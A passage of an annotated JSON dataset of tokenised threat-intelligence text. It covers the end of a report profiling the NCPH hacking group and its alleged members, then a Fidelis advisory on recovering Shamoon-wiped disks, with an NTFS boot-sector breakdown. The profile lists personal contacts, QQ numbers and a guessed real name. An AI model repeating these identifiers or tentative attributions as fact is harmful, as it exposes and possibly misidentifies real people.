"paying", "group", "members", "for", "their", "work", "as", "hackers", "."], ["During", "the", "time", "of", "targeted", "attacks", "in", "2006", "their", "income", "increased", "significantly", ",", "to", "full-time"], ["wages", "for", "part", "time", "hacking", ".", "Wicked", "Rose", ",", "leader", "of", "the", "group", ",", "is", "pictured", "below:"], ["\u73ab\u7470", "\u9ed1\u5ba2", "(MeiGui", "HeiKe)", "\u201cRose", "Hacker\u201d"], ["QQ", "number", "is", "5372453", "www", ".", "mghacker.com"], ["Wicked", "Rose", "maintains", "a", "personal", "site", "at", "www", ".", "mghacker.com."], ["Wicked", "Rose's", "Website:", "www", ".", "mghacker.com"], ["Rose", "is", "an", "approximate", "20-year-old", "(2006)", "student", "at", "the", "Sichuan", "University", "of", "Science", "&"], ["Engineering", ".", "In", "the", "spring", "of", "2006", "Wicked", "Rose", "claims", "to", "have", "dropped", "out", "of", "school", "for", "full"], ["time", "hacking", "opportunities", ".", "Specifically", ",", "on", "April", "30", ",", "2006", "his", "blog", "entry", "claims", "he", "did", "not"], ["register", "for", "his", "university", "exam", ".", "He", "performed", "significant", "updates", "to", "his", "rootkit", "code", "from"], ["March", "through", "June", "2006", ".", "He", "later", "returned", "to", "school", "by", "September", "2006", "."], ["Wicked", "Rose", "claims", "responsibility", "on", "his", "blog", "for", "targeted", "e-mail", "based", "attacks", "containing"], ["Microsoft", "Word", "and", "CHM", "exploits", "from", "the", "spring", "of", "2006", "."], ["Other", "NCPH-member", "websites", "include:", "http://rodag", ".", "blogbus.com,"], ["http://www", ".", "cppblog.com/charles", "and", "http://kungbim", ".", "blogbus.com.", "The", "main", "NCPH", "website", "is"], ["www", ".", "ncph.net:"], ["NCPH", "Studio", "website", "www", ".", "ncph.net"], ["Registration", "information", "for", "ncph", ".", "net", "reveals", "a", "Chinese", "registrant:"], ["Registrant", "Contact:", "ncph", "studio", "(ncph2005@126", ".", "com)", "si", "chuan", "li", "gong", "xue", "yuan"], ["zigong", ",", "Sichuan", ",", "cn", "643000", "P:", "+86", ".", "13154663992", "F:", "+86", ".", "13154663992"], ["The", "main", "location", "of", "the", "NCPH", "group", "is", "in", "Zigong", ",", "Sichuan", "Province", ",", "in", "south-central", "China", "."], ["Zigong", ",", "Sichuan", "Province", ",", "in", "south-central", "China"], ["The", "NCPH", "group", "(NCPH", "Studio)", "in", "Zigong", ",", "China", ",", "is", "shown", "here:"], ["NCPH", "hackers", "at", "work", "in", "the", "\u201cncph", "studio\u201d"], ["Left", "to", "right:", "\u201cWicked", "Rose", ",", "\u201d", "KuNgBiM", ",", "Charles", "and", "Rodag"], ["Additional", "photos", "featuring", "Wicked", "Rose", "and", "NCPH", "hackers", "are", "below", ",", "captured", "from", "their"], ["various", "websites", "and", "blog", "entries", "in", "2006", ".", "Chinese", "translation", "for", "each", "photo", "are", "below:"], ["\"Wicked", "Rose\""], ["From", "an", "ancient", "Chinese", "poem", ","], ["expressing", "the", "devotion", "of", "his", "heart", "for"], ["hacking", "."], ["\"After", "you", "choose", "the", "technology", "you"], ["love", ",", "you", "have", "to", "research", "every", "system"], ["and", "code", "everyday", "!", "\""], ["Charles:", "\"Silence", "belongs", "to", "our"], ["world", ".", "..\""], ["Charles"], ["\"Charles", "always", "laughs", "so", "brightly", "when"], ["searching", "for", "program", "problems", "!", "\""], ["KuNgBiM"], ["\"Only", "we", "can", "feel", "this", "kind", "of", "happy", ".", "..\""], ["Ronag"], ["\"Behind", "every", "successful", "design", ",", "he"], ["always", "has", "a", "slight", "smile\u2026\""], ["Wicked", "Rose", "and", "NCPH", "hacking", "photos"], ["WHG", "(\u201cFig\u201d)"], ["WHG", "is", "not", "a", "core", "member", "of", "NCPH", "but", "a", "close", "affiliate", "of", "Wicked", "Rose", ".", "WHG", "appears", "to", "be"], ["central", "to", "development", "of", "the", "NCPH", "rootkit", ",", "aka", "GinWui", ".", "WHG", "is", "credited", "by", "Wicked", "Rose", "as"], ["one", "of", "the", "authors", "of", "this", "malicious", "code", ".", "WHG", "is", "an", "experienced", "malicious", "code", "author", "with"], ["the", "following", "contact", "information:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["E-mail", "address:"], ["QQ", "Number:"], ["Website:"], ["Real", "Name:"], ["Location:"], ["whg@163", ".", "com"], ["312016"], ["http://cnasm", ".", "com"], ["May", "be", "\"Zhao", "Jibing\",\u8d75\u7eaa\u658c", "."], ["Believed", "to", "be", "employed", "in", "the", "Sichuan", "province", "of", "China", "."], ["WZT"], ["WZT", "is", "a", "former", "member", "of", "the", "NCPH", "group", "who", "was", "kicked", "out", "during", "the", "time", "of", "zero-day"], ["attacks", "in", "May", "2006", ".", "WZT", "was", "removed", "on", "May", "20", ",", "2006", ".", "During", "this", "time", "period", "the", "zeroday", "attacks", "became", "publicly", "disclosed", ",", "increasing", "pressure", "upon", "the", "hacking", "group", ".", "It", "is", "feasible"], ["that", "WZT", "may", "have", "offended", "the", "group", "in", "some", "way", "related", "to", "zero-day", "attack", "techniques", ",", "strife"], ["over", "hacker", "for", "hire", "deals", ",", "or", "competition", "for", "hacker", "for", "hire", "deals", "."], ["WZT", "is", "a", "former", "coding", "expert", "within", "the", "NCPH", "group", "and", "many", "years", "experience", "in", "hacking", "."], ["He", "is", "responsible", "for", "creating", "multiple", "tools", "and", "regularly", "giving", "credit", "to", "the", "infamous", "Li0n"], ["Chinese", "hacker", "(founder", "of", "Honker", "Union", "(HUC)", "Chinese", "group", ".", "WZT", "maintains", "a", "website", "at"], ["tthacker", ".", "cublog.cn."], ["The", "Jiangsu", "Connection", "?"], ["WHOIS", "registrant", "data", "for", "related", "domains", "used", "within", "attacks", "and", "hacker", "sites", "reveals", "a"], ["connection", "with", "the", "Jiangsu", "province", "of", "China", ".", "One", "domain", ",", "windowsupdates", ".", "net,", "is", "used", "in"], ["attacks", "and", "revolves", "to", "an", "IP", "address", "in", "the", "Sichuan", "province", ".", "Meanwhile", ",", "the", "registrant"], ["\"zhaofeng", "network\"", "is", "reportedly", "based", "out", "of", "Jiangsu", ",", "not", "Sichuan", ".", "Some", "of", "the", "WHOIS"], ["information", "clearly", "contains", "fraudulent", "information", "to", "presumably", "direct", "researchers", "away", "from"], ["the", "true", "identity", "and", "location", "of", "the", "attacker", "responsible", "for", "registering", "the", "hostile", "domain", ".", "The"], ["connection", "to", "the", "Jiangsu", "and", "Sichuan", "provinces", "remains", "unclear", "."], ["8"], ["Concluding", "Comments"], ["Prior", "to", "Wicked", "Rose", "and", "NCPH", "hacker", "for", "hire", "attacks", "in", "2006", ",", "Chinese", "hackers", "are", "only"], ["known", "for", "their", "patriotic", "hacking", ".", "This", "disturbing", "development", "reveals", "two", "critical", "threats:", "1)"], ["motives", "of", "Chinese", "hackers", "are", "changing", "2)", "Chinese", "hackers", "are", "regularly", "associated", "with"], ["sophisticated", "attacks", "as", "of", "2006", "."], ["Wicked", "Rose", "implicates", "himself", "in", "his", "early", "blog", "entries", "and", "website", "posts", "in", "2006", "and", "prior", "."], ["An", "unknown", "company", "or", "entity", "reportedly", "paid", "Wicked", "Rose", "for", "hacking", "at", "the", "rate", "of", "2", ",", "000"], ["RMB", "a", "month", ",", "about", "$250", "USD", ".", "At", "this", "time", "Wicked", "Rose", "gave", "200", "RMB", "to", "NCPH", "hackers"], ["and", "kept", "the", "rest", "for", "himself", ".", "Once", "targeted", "attacks", "took", "place", "the", "payment", "increased", "five-fold", "to"], ["5", ",", "000", "RMB", "monthly", "with", "$1", ",", "000", "a", "month", "going", "to", "NCPH", "hackers", ".", "This", "is", "a", "significant", "amount"], ["of", "money", "in", "China", ",", "effectively", "paying", "hackers", "a", "full-time", "wage", "for", "part-time", "hacking", "."], ["Throughout", "the", "summer", "of", "2006", ",", "while", "Wicked", "Rose", "was", "not", "in", "school", ",", "over", "35", "zero-day"], ["attacks", ",", "proof-of-concept", "codes", ",", "and", "attacks", "against", "un-patched", "Microsoft", "Office", "vulnerabilities"], ["are", "discovered", "in", "the", "wild", ".", "With", "Wicked", "Rose", "claiming", "responsibility", "for", "early", "attacks", "and", "the"], ["lead", "author", "of", "both", "GinWui", "and", "the", "NCPH", "hacking", "group", ",", "there", "is", "little", "doubt", "left", "as", "to", "his"], ["involvement", "in", "attacks", "to", "date", "."], ["By", "the", "end", "of", "2006", "attacks", "become", "increasingly", "sophisticated", ".", "In", "one", "instance", "a", "popular"], ["PowerPoint", "file", "distributed", "during", "the", "Christmas", "holiday", "season", "for", "the", "last", "two", "years", "prior", "is"], ["used", "within", "a", "socially", "engineered", "attack", "upon", "one", "individual", "within", "an", "energy", "sector", "US", "based"], ["company", ".", "The", "PowerPoint", "file", "is", "modified", "to", "include", "an", "exploit", "that", "silently", "installs", "malicious"], ["code", ".", "This", "same", "individual", "receives", "another", "e-mail", "containing", "a", "Microsoft", "Word", "exploit", ".", "In", "this"], ["case", "only", "one", "individual", "within", "the", "company", "is", "targeted", ",", "and", "with", "just", "two", "messages", "socially"], ["engineered", "for", "maximum", "success", ".", "This", "is", "a", "much", "more", "targeted", "and", "stealthy", "approach", "for"], ["attacks", "compared", "to", "the", "earlier", "attacks", "performed", "by", "the", "group", "in", "the", "late", "spring", "of", "2006", "."], ["NCPH", "continues", "to", "be", "a", "significant", "threat", "going", "forth", "for", "several", "reasons", "."], ["1", ".", "Attacks", "continue", "to", "take", "place", "in", "the", "wild", "and", "are", "very", "difficult", "to", "identify", "on", "a", "targeted"], ["basis", ".", "Only", "the", "most", "sophisticated", "networks", "and", "system", "administrators", "are", "able", "to"], ["properly", "protect", "and", "capture", "hostile", "targeted", "attack", "files", "before", "an", "attack", "takes", "place", "."], ["2", ".", "NCPH", "is", "a", "serious", "dedicated", "hacking", "group", "that", "is", "methodical", "and", "disciplined", "in", "their"], ["development", "of", "new", "exploits", "and", "attacks", "."], ["3", ".", "NCPH", "is", "motivated", "by", "both", "the", "thrill", "and", "challenge", "of", "hacking", "and", "money", "as", "a", "motive", "."], ["4", ".", "Attacks", "by", "the", "group", "are", "highly", "targeted", "and", "stealthy", ",", "very", "difficult", "to", "detect", "and", "remove", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Time", "name": "November 1 2012", "sent_id": 6, "pos": [0, 3]}, {"old_id": "T2", "type": "Time", "name": "2012-11-01", "sent_id": 10, "pos": [0]}, {"old_id": "T3", "type": "Malware", "name": "Shamoon", "sent_id": 12, "pos": [1]}, {"old_id": "T4", "type": "Malware", "name": "Shamoon", "sent_id": 27, "pos": [6]}, {"old_id": "T5", "type": "Time", "name": "August 15 2012", "sent_id": 28, "pos": [8, 11]}, {"old_id": "T6", "type": "Organization", "name": "Securelist", "sent_id": 31, "pos": [6]}, {"old_id": "T7", "type": "Person", "name": "Kaspersky\u2019s", "sent_id": 31, "pos": [5]}, {"old_id": "T8", "type": "Malware", "name": "Shamoon", "sent_id": 32, "pos": [3]}, {"old_id": "T9", "type": "Organization", "name": "General Dynamics Fidelis Cybersecurity Solutions", "sent_id": 32, "pos": [5, 9]}, {"old_id": "T10", "type": "Software", "name": "Windows XP", "sent_id": 117, "pos": [13, 14]}, {"old_id": "T11", "type": "Software", "name": "Windows 2003", "sent_id": 118, "pos": [0, 1]}, {"old_id": "T12", "type": "Software", "name": "Windows 7", "sent_id": 118, "pos": [0, 5]}, {"old_id": "T13", "type": "Software", "name": "Windows 7", "sent_id": 118, "pos": [0, 5]}, {"old_id": "T14", "type": "Malware", "name": "Shamoon", "sent_id": 111, "pos": [6]}, {"old_id": "T15", "type": "Malware", "name": "Shamoon", "sent_id": 116, "pos": [15]}, {"old_id": "T16", "type": "Software", "name": "EnCase", "sent_id": 223, "pos": [12]}, {"old_id": "T17", "type": "Software", "name": "EnCase", "sent_id": 224, "pos": [8]}, {"old_id": "T18", "type": "Software", "name": "EnCase", "sent_id": 237, "pos": [7]}, {"old_id": "T19", "type": "Software", "name": "EnCase", "sent_id": 240, "pos": [10]}, {"old_id": "T20", "type": "Software", "name": "WinHex", "sent_id": 241, "pos": [15]}, {"old_id": "T21", "type": "Software", "name": "XP/2003", "sent_id": 248, "pos": [1]}, {"old_id": "T22", "type": "Software", "name": "Windows 7", "sent_id": 248, "pos": [8, 9]}, {"old_id": "T23", "type": "Software", "name": "Windows 2003", "sent_id": 258, "pos": [6, 7]}, {"old_id": "T24", "type": "Software", "name": "EnCase", "sent_id": 277, "pos": [0]}, {"old_id": "T25", "type": "Software", "name": "EnCase", "sent_id": 297, "pos": [13]}, {"old_id": "T26", "type": "Malware", "name": "Shamoon", "sent_id": 314, "pos": [11]}, {"old_id": "T27", "type": "Software", "name": "Fidelis XPS Internal Sensor", "sent_id": 318, "pos": [9, 12]}], "labels": [{"old_id": "R1", "r": "P33", "h": 3, "t": 4, "evidence": [27, 28]}], "title": ["inputs/txt/201211FidelisShamoon"], "sents": [["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fidelis", "Threat", "Advisory", "#1007"], ["RECOVERING", "FROM", "SHAMOON"], ["November", "1", ",", "2012"], ["Document", "Status:"], ["Last", "Revised:"], ["FINAL"], ["2012-11-01"], ["Executive", "Summary"], ["The", "Shamoon", "malware", "has", "received", "considerable", "coverage", "in", "the", "past", "couple", "of", "months"], ["because", "of", "its", "destructive", "nature", ".", "Despite", "assertions", "that", "it", "is", "the", "work", "of", "amateurs", ",", "it", "has", "had", "a"], ["major", "impact", "on", "companies", "believed", "to", "have", "been", "affected", ".", "The", "basic", "functions", "of", "the", "malware"], ["are", "to", "infect", ",", "entrench", ",", "propagate", ",", "and", "wipe", "."], ["However", "because", "of", "the", "way", "the", "malware", "operates", "and", "how", "it", "is", "programmed", "to", "wipe", ",", "it", "can", "find"], ["itself", "being", "its", "own", "enemy", ".", "It", "will", "wipe", "data", "found", "in", "the", "Documents", "and", "Settings", "folder", "and", "the"], ["System32", "folder", ",", "and", "then", "use", "a", "signed", "driver", "for", "disk", "access", "to", "start", "wiping", "at", "the", "disk", "level", "."], ["Because", "the", "operating", "system", "needs", "certain", "files", "in", "the", "System32", "folder", "to", "run", ",", "it", "was", "found", "that"], ["infected", "hosts", "will", "always", "restart", "before", "the", "malware", "can", "wipe", "completely", "at", "the", "disk", "level", "."], ["Due", "to", "this", "it", "was", "possible", "to", "make", "a", "complete", "recovery", "of", "Shamoon-infected", "file", "systems", "to", "the"], ["state", "they", "were", "in", "before", "the", "wiping", "made", "the", "OS", "unbootable", "and", "unreadable", ".", "In", "fact", "the", "majority"], ["of", "files", "outside", "of", "the", "System32", "and", "Document", "and", "Settings", "folder", "are", "recoverable", "as", "well;", "this"], ["provided", "the", "opportunity", "for", "a", "successful", "and", "fruitful", "analysis", ",", "investigation", ",", "and", "remediation"], ["effort", "."], ["Threat", "Overview"], ["According", "to", "community", "write-ups", ",", "the", "Shamoon", "malware", "appears", "to", "have", "been", "deployed"], ["against", "a", "couple", "of", "entities", "on", "or", "about", "August", "15", ",", "2012", ".", "The", "malware", "had", "self-propagating"], ["qualities", "and", "was", "designed", "to", "overwrite", "data", "on", "disks", "attached", "to", "or", "accessible", "from", "targeted"], ["systems", ".", "The", "malware\u2019s", "functionality", ",", "briefly", "summarized", "below", ",", "was", "covered", "in", "some", "detail", "in"], ["community", "postings", ",", "such", "as", "Kaspersky\u2019s", "Securelist", "blog", ".", "Analysis", "details", "and", "testing", "of", "an"], ["available", "sample", "of", "Shamoon", "by", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", "researchers"], ["revealed", "that", "the", "malware\u2019s", "wipe", "operations", "did", "not", "overwrite", "entire", "disks", ",", "but", "rather", "overwrote"], ["enough", "to", "prevent", "access", "to", "the", "affected", "file", "systems", ",", "along", "with", "substantial", "amounts", "of", "file", "data", "."], ["However", ",", "analysis", "indicated", "that", "some", "files", "were", "still", "intact", "after", "the", "malware\u2019s", "write", "operations"], ["and", "subsequent", "system", "reboot", "."], ["Users", "are", "granted", "permission", "to", "copy", "and/or", "distribute", "this", "document", "in", "its", "original", "electronic", "form", "and", "print", "copies", "for", "personal", "use", ".", "This"], ["document", "cannot", "be", "modified", "or", "converted", "to", "any", "other", "electronic", "or", "machine-readable", "form", "in", "whole", "or", "in", "part", "without", "prior", "written"], ["approval", "of", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions", ",", "Inc", "."], ["While", "we", "have", "done", "our", "best", "to", "ensure", "that", "the", "material", "found", "in", "this", "document", "is", "accurate", ",", "Fidelis", "makes", "no", "guarantee", "that", "the"], ["information", "contained", "herein", "is", "error", "free", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "1", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["Fidelis", "researchers", "surmised", "there", "might", "be", "a", "means", "of", "recovering", "file", "data", "from", "targeted"], ["systems", "from", "a", "forensic", "and", "investigative", "analysis", "point", "of", "view", ".", "With", "this", "goal", "in", "mind", ","], ["researchers", "tested", "several", "possible", "ways", "of", "restoring", "disk", "data", "critical", "to", "the", "access", "of", "the"], ["targeted", "disk\u2019s", "file", "system", ".", "What", "follows", "is", "a", "brief", "description", "of", "what", "the", "sample", "of", "the", "Shamoon"], ["malware", "does", "and", "a", "description", "and", "results", "of", "researchers\u2019", "file", "system", "recovery", "efforts", "."], ["Shamoon", "Wiper", "Functionality", "Actions:"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["-\u00ad\u2010"], ["Executes", "a", "copy", "of", "itself", "as", "a", "scheduled", "job"], ["Deletes", "the", "file", "created", "for", "the", "scheduled", "job"], ["Entrenches", "itself", "as", "a", "service"], ["Execution", "of", "the", "entrenched", "file", "results", "in", "a", "dropped", "driver"], ["The", "dropped", "driver", "is", "loaded", "and", "executed"], ["The", "dropped", "driver", "facilitates", "disk", "access"], ["The", "malware", "overwrites", "disk", "data", "to", "include", "the", "contents", "of", "\\\\Documents", "and", "Settings"], ["(user", "data)", "and", "\\\\Windows\\system32", "(system", "data)", "directories"], ["The", "malware", "eventually", "overwrites", "the", "disk\u2019s", "boot", "records", "(Master", "Boot", "Record", "(MBR)"], ["and", "Volume", "Boot", "Record", "(VBR))", "(Note:", "Testing", "was", "accomplished", "on", "disks", "with", "one"], ["partition)"], ["The", "malware", "appears", "to", "target", "user", "data", "first", ",", "then", "system", "data"], ["The", "nature", "of", "the", "overwrites", "is", "such", "that", "the", "malware", "writes", "only", "a", "certain", "amount", "of", "data"], ["to", "targeted", "files", ",", "starting", "at", "the", "files\u2019", "beginning", "(Offset", "0x0)", "and", "then", "writing", "a", "certain"], ["amount", "of", "data", "to", "other", "file", "locations"], ["Fidelis", "researcher", "observations", "included", "the", "following:"], ["o", "At", "some", "point", "during", "the", "writing", "(wiping)", "process", ",", "the", "targeted", "system", "tries", "to"], ["read", "file", "data", "that", "has", "been", "overwritten", ",", "prompting", "an", "attempt", "to", "restore", "the"], ["involved", "file"], ["o", "The", "system", "asks", "the", "user", "for", "media", "containing", "system", "files", "when", "it", "cannot", "find"], ["the", "system", "files", "it", "is", "looking", "for"], ["o", "The", "targeted", "system", "eventually", "reboots", ",", "resulting", "an", "error", "on", "restart", "because", "of"], ["the", "overwritten", "boot", "records"], ["o", "The", "disks", "targeted", "in", "testing", "were", "not", "completely", "overwritten;", "there", "was", "still"], ["apparently", "viable", "file", "data", "on", "the", "targeted", "disks"], ["o", "The", "result", "of", "the", "malware\u2019s", "operation", "was", "the", "prevention", "of", "accessing", "the"], ["targeted", "file", "system"], ["Note:", "The", "Shamoon", "sample", "Fidelis", "researchers", "had", "available", "looked", "very", "similar", "to", "that", "detailed"], ["in", "community", "write-ups", ".", "However", ",", "as", "of", "the", "date", "of", "publication", ",", "researchers", "were", "still", "analyzing"], ["the", "available", "sample", ".", "Therefore", ",", "differences", "between", "the", "available", "sample", "and", "others", "available"], ["to", "the", "community", "may", "become", "apparent", "in", "the", "future", "."], ["Analysis", "and", "Testing", "Overview"], ["Fidelis", "initially", "approached", "the", "Shamoon", "analysis", "strictly", "from", "a", "perspective", "of", "determining", "what"], ["forensic", "artifacts", "could", "be", "recovered", "from", "a", "targeted", "system", ".", "The", "goal", "was", "at", "least", "a", "partial"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "2", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["reconstruction", "of", "the", "events", "precipitating", "the", "Shamoon", "attack", ",", "and", "possibly", "using", "those", "events"], ["found", "on", "the", "targeted", "systems", "to", "determine", "a", "start", "of", "the", "attack", ",", "and", "a", "possible", "source", ".", "Analysis"], ["revealed", "the", "possibility", "that", "some", "user", "data", "would", "be", "recovered", "as", "a", "side", "benefit", "to", "the", "forensic"], ["analysis", "process", "."], ["Three", "types", "of", "operating", "systems", "were", "used", "for", "testing", "purposes;", "all", "testing", "occurred", "on", "laptops", "."], ["The", "laptops", "were", "wiped", ",", "had", "the", "operating", "system", "installed", ",", "and", "then", "had", "the", "Shamoon", "malware"], ["executed", "on", "the", "system", ".", "The", "three", "operating", "systems", "used", "for", "testing", "were", "Windows", "XP", ","], ["Windows", "2003", ",", "and", "Windows", "7", ".", "The", "malware", "executed", "with", "no", "issues", "except", "on", "Windows", "7", "."], ["The", "User", "Access", "Control", "(UAC)", "on", "the", "Windows", "7", "systems", "had", "to", "be", "turned", "off", "before", "the"], ["malware", "would", "execute", "and", "perform", "the", "wiping", "action", "as", "has", "been", "observed", "on", "other", "machines", "."], ["This", "has", "been", "noted", "by", "others", "in", "the", "community", "as", "well", ",", "specifically", "that", "Administrator", "access", "is"], ["needed", "for", "initially", "launching", "Shamoon", "."], ["Shamoon", "operation", "results", "in", "much", "of", "the", "data", "on", "the", "affected", "systems", "being", "overwritten", "with", "the"], ["fragmented", "image", "of", "a", "burning", "flag", ".", "As", "has", "been", "detailed", "above", ",", "the", "wipe", "function", "will", "overwrite"], ["data", "within", "the", "Documents", "and", "Settings", "folder", "followed", "by", "the", "System32", "folder", ",", "and", "then", "it", "will"], ["start", "the", "physical", "disk", "access", "and", "start", "the", "wiping", "at", "the", "disk", "level", ".", "If", "the", "system", "restarts", "before"], ["the", "malware", "has", "completed", "wiping", "the", "disk", "then", "much", "of", "the", "data", "can", "still", "be", "recovered:", "each", "of"], ["our", "tests", "showed", "the", "system", "did", "restart", "before", "the", "disk", "was", "completely", "wiped", ".", "The", "amount", "wiped"], ["from", "the", "host", "will", "never", "be", "the", "same", "from", "system", "to", "system", ",", "mainly", "because", "the", "size", "of", "the", "disk"], ["and", "partitions", "will", "all", "need", "to", "be", "taken", "into", "account", "."], ["VBR", "and", "File", "System", "Recovery", "Strategies"], ["The", "following", "is", "the", "view", "of", "the", "wiped", "disk", "for", "each", "of", "the", "operating", "systems", "that", "we", "tested:"], ["Fig", "1", ".", "Example", "of", "wiped", "of", "MBR", "and", "VBR", "wiped", "by", "Shamoon", "Malware", "."], ["Figure", "1", "was", "found", "at", "the", "MBR", "(Sector", "0)", "and", "the", "VBR", "(Sector", "63/56", "(XP", ",", "2003)", ",", "and"], ["2048/206848", "(7))", "of", "each", "of", "the", "operating", "systems", "(As", "well", "as", "throughout", "the", "drive)", ".", "Fidelis"], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "3", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["researchers", "decided", "to", "look", "further", "into", "the", "drive", "and", "find", "if", "there", "was", "any", "possibility", "of", "recovering"], ["files", "or", "logs", "that", "would", "help", "illuminate", "what", "happened", "to", "the", "systems", ",", "and", "if", "any", "artifacts", "of", "the"], ["malware", "could", "be", "recovered", "."], ["Note", "on", "the", "VBR:", "VBR", "stands", "for", "Volume", "Boot", "Record", ",", "and", "is", "made", "up", "of", "the", "boot", "sector", "and"], ["bootstrap", "code", ".", "The", "boot", "sector", "takes", "up", "1", "sector", "on", "the", "drive;", "the", "next", "6", "sectors", "on", "the", "drive", "are"], ["allocated", "for", "the", "bootstrap", "code", ".", "In", "all", "16", "sectors", "are", "allocated", "in", "total", "for", "the", "VBR", ".", "The", "VBR", "is"], ["created", "when", "a", "file", "system", "is", "created", "on", "a", "partition", ".", "In", "this", "paper", "we", "will", "be", "covering", "the", "NTFS"], ["Boot", "Record", ".", "The", "VBR", "is", "used", "to", "load", "machine", "code", "into", "RAM", "to", "start", "a", "program", ".", "Normally", "this"], ["program", "is", "the", "operating", "system", "."], ["Keyword", "searches", "revealed", "that", "there", "were", "still", "files", "that", "would", "be", "recoverable", "on", "the", "system", ".", "In"], ["particular", "it", "was", "found", "that", "registry", "files", "and", "headers", "were", "still", "on", "the", "disk", ".", "After", "this", ",", "it", "was", "found"], ["that", "the", "Master", "File", "Table", "(MFT)", "was", "still", ",", "for", "the", "most", "part", ",", "intact", ".", "Trying", "to", "avoid", "the", "long", "and"], ["laborious", "process", "of", "carving", "files", "from", "the", "disk", ",", "researchers", "decided", "that", "it", "would", "instead", "be"], ["worth", "the", "time", "to", "try", "and", "recover", "the", "file", "system", "."], ["When", "the", "Windows", "operating", "system", "is", "installed", "or", "an", "NTFS", "volume", "created", ",", "a", "backup", "copy", "of"], ["the", "VBR", "is", "written", "to", "the", "last", "sector", "of", "the", "volume", ".", "This", "is", "a", "very", "important", "detail", ",", "as", "the", "forensic"], ["value", "of", "the", "VBR", "is", "substantial", "(See", "Figure", "2)", ".", "The", "area", "that", "will", "contain", "the", "critical", "information", "is"], ["known", "as", "the", "Bios", "Parameter", "Block", "(BPB)", ".", "With", "this", "information", "it", "is", "possible", "to", "rebuild", "the", "file"], ["system", "as", "it", "existed", "before", "the", "wipe", "."], ["Threat", "Advisory", "#1007"], ["Rev", ".", "2012-11-01"], ["Copyright", "\u00a9", "2012", "General", "Dynamics", "Fidelis", "Cybersecurity", "Solutions"], ["Recovering", "From", "Shamoon"], ["Page", "4", "of", "9"], ["www", ".", "fidelissecurity.com"], ["www", ".", "threatgeek.com"], ["@FidSecSys"], ["+1", "800", ".", "652.4020"], ["EB", "52", "90", "4E", "54", "46", "53", "20", "20", "20", "20", "00", "02", "08", "00", "00", "00", "00", "00", "00", "00", "F8", "00", "00", "3F", "00", "FF", "00", "3F", "00", "00", "00", "00", "00"], ["00", "00", "80", "00", "80", "00", "C0", "F8", "F8", "0D", "00", "00", "00", "00", "00", "00", "0C", "00", "00", "00", "00", "00", "8C", "8F", "DF", "00", "00", "00", "00", "00", "F6", "00", "00"], ["00", "01", "00", "00", "00", "26", "FA", "CA", "70", "02", "CB", "70", "44", "00", "00", "00", "00"], ["[\u2026", "Truncated", "for", "size", "\u2026]"], ["00", "00", "55", "AA"], ["EB", "52", "90", "\u2013", "Instruction", "to", "jump", "to", "boot", "code", "(Not", "necessary", "for", "our", "application)"], ["4E", "54", "46", "53", "20", "20", "20", "20", "\u2013", "OEM", "Name", "(NTFS"], [")"], ["00", "02", "\u2013", "Bytes", "per", "sector", ",", "0x0200", "=", "512", "Bytes", "."], ["08", "\u2013", "Sectors", "per", "cluster", "=", "8"], ["F8", "\u2013", "Media", "descriptor", "(Not", "necessary", "for", "our", "application)"], ["C0", "F8", "F8", "0D", "00", "00", "00", "00", "\u2013", "Total", "sectors", "in", "file", "system", ",", "0x00DF8F8C0", "=", "234420416", "Sectors", "(Add", "on", "the"], ["sector", "location", "of", "VBR", "for", "actual", "end", "of", "the", "file", "system", ",", "in", "this", "example", "the", "VBR", "is", "at", "sector", "63", "therefore", "the"], ["total", "sectors", "in", "the", "file", "system", "are", "234420416", "+", "63", "=", "234420479)"], ["00", "00", "0C", "00", "00", "00", "00", "00", "\u2013", "Starting", "cluster", "of", "the", "MFT", ",", "0X000C0000", "=", "786432", "Clusters", ".", "786432", "*", "8", "(Cluster"], ["size)", "+63", "(VBR", "Sector)", "=", "6291519", "Sectors"], ["8C", "8F", "DF", "00", "00", "00", "00", "00", "\u2013", "Starting", "cluster", "of", "the", "MFT", "mirror", ",", "0x00DF8F8C", "=", "14651276", ".", "14651276", "*", "8", "+", "63"], ["=", "117210271", "Sectors"], ["F6", "\u2013", "Size", "of", "MFT", "Entry", ",", "246", "."], ["01", "\u2013", "Index", "size", ",", "1", "."], ["26", "FA", "CA", "70", "02", "CB", "70", "44", "\u2013", "Serial", "number", "."], ["For", "more", "technical", "information", "on", "file", "systems", "and", "their", "forensic", "value", ",", "Brian", "Carrier\u2019s", "book", "File", "System"], ["Forensic", "Analysis", "is", "an", "invaluable", "tool", "."], ["Fig", "2", ".", "Example", "of", "a", "broken", "down", "BPB", "found", "within", "the", "boot", "sector", "."], ["Just", "because", "the", "boot", "sector", "of", "the", "VBR", "is", "recoverable", "doesn\u2019t", "mean", "that", "everything", "on", "the", "file"], ["system", "will", "be", "restored", "to", "normal", ".", "If", "a", "file", "was", "wiped", "by", "the", "malware", "then", "it", "will", "still", "be", "wiped", ",", "or"], ["partially", "wiped", ".", "However", 